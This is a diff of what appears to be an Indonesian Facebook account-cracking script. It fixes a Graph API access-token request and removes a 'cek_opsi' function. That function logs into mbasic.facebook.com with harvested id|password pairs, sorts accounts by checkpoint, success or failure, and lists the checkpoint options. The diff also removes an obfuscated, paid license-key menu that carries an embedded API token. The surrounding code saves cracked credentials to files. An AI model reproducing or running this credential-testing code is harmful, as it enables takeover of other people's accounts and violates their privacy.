@@ -92,7 +92,7 @@ def login():
 			token = open('.token.txt','r').read()
 			tokenku.append(token)
 			try:
-				sy = requests.get('https://graph.facebook.com/me?access_token=%s'+tokenku[0])
+				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
 				sy2 = json.loads(sy.text)['name']
 				sy3 = json.loads(sy.text)['id']
 				sy4 = json.loads(sy.text)['birthday']
@@ -846,106 +846,6 @@ def ceker(idf,pw):
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 
-def cek_opsi():
-	c = len(akun)
-	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
-	cetak(nel(hu, title='CEK OPSI'))
-	input(x+'['+h+'•'+x+'] Mulai')
-	cek = '# PROSES CEK OPSI DIMULAI'
-	sol().print(mark(cek, style='green'))
-	love = 0
-	for kes in akun:
-		try:
-			try:
-				id,pw = kes.split('|')[0],kes.split('|')[1]
-			except IndexError:
-				time.sleep(2)
-				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
-				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
-				continue
-			bi = random.choice([u,k,kk,b,h,hh])
-			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
-			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
-			ses = requests.Session()
-			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			hi = ses.get('https://mbasic.facebook.com')
-			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
-			if "checkpoint" in ses.cookies.get_dict().keys():
-				try:
-					jo = ho.find('form')
-					data = {}
-					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
-					for anj in jo('input'):
-						if anj.get('name') in lion:
-							data.update({anj.get('name'):anj.get('value')})
-					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
-					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
-					opsi = kent.find_all('option')
-					if len(opsi)==0:
-						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
-					else:
-						for opsii in opsi:
-							print('\r%s---> %s%s'%(kk,opsii.text,x))
-				except:
-					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
-					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
-			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
-			else:
-				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
-			love+=1
-		except requests.exceptions.ConnectionError:
-			print('')
-			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
-			sol().print(mark(li, style='red'))
-			exit()
-	dah = '# DONE'
-	sol().print(mark(dah, style='green'))
-	exit()
-
-
-def kontol():
-    os.system("clear")
-    print(f"""    __    _________________   _______ ______
-   / /   /  _/ ____/ ____/ | / / ___// ____/
-  / /    / // /   / __/ /  |/ /\__ \/ __/
- / /____/ // /___/ /___/ /|  /___/ / /___
-/_____/___/\____/_____/_/ |_//____/_____/
-
-{P}[•]{B}----------------------------------------------------{P}[•]
-{B} |
-{P}[•] AUTHOR : M ZAINUL UMAM
-{P}[•] WHATSAPP : 085740559154
-{B}[•] FACEBOOK : Zainul Umam""")
-def __key__ ():#line:42
-  try :#line:43
-    os .system ('clear')
-    kontol()
-    print (f"""
-{U}[{P}1{U}]{P} Dapatkan Api key
-{U}[{P}2{U}]{P} Masukan Api Key
-{U}[{P}3{U}]{P} Keluar {U}[{H}Exit{U}]{H}
-""")#line:49
-    OOO00O0OOO00OO00O =input (f"{H}[{P}?{H}]{P} Choose :{K} ")#line:50
-    if OOO00O0OOO00OO00O in ['1','01']:#line:51
-      print (f"{H}[{P}!{H}]{P} Anda Akan Diarahkan Ke Whatsapp...");time .sleep (3 );os .system ('xdg-open https://wa.me/6281295853971?text=Bang+Danzz+Beli+Lisensi');exit ()#line:52
-    elif OOO00O0OOO00OO00O in ['2','02']:#line:53
-      O000O000OOO000OOO =input (f"{H}[{P}?{H}]{P} Api Key :{K} ")#line:54
-      if len (O000O000OOO000OOO )==0 :#line:55
-        exit (f"{P}[{M}!{P}]{M} Jangan Kosong")#line:56
-      else :#line:57
-        with requests .Session ()as O0O0OO0O0O00OOOO0 :#line:58   #### ISI TOKEN LU DAN   ID LU
-          OOO00OO00O0O0OOOO =O0O0OO0O0O00OOOO0 .get (f'https://app.cryptolens.io/api/key/activate?token=WyIxNTc5MTYyNiIsIlpueDFEVUlDQmpsNnB1a2VjYWRhbGR0QnVpRkY5MkF6YzExaTZPODMiXQ==&ProductId=14543&Key={O000O000OOO000OOO}&Sign=False').json ()['licenseKey']#line:59
-          open ('apikey.txt','w').write (O000O000OOO000OOO )#line:60
-          print (f"{H}[{P}*{H}]{P} Expired :{K} {OOO00OO00O0O0OOOO['expires'].split('T')[0]}");time .sleep (2 );login()#line:61
-    elif OOO00O0OOO00OO00O in ['3','03']:#line:62
-      exit ()#line:63
-    else :#line:64
-      exit (f"{P}[{M}!{P}]{M} Wrong Input")#line:65
-  except (KeyError ):#line:66
-    exit (f"{P}[{M}!{P}]{M} Api Key Invalid")#line:67
-  except Exception as O0OO00OOO000OOO00 :#line:68
-    exit (f"{P}[{M}!{P}]{M} {O0OO00OOO000OOO00}")#line:69
 
 
 
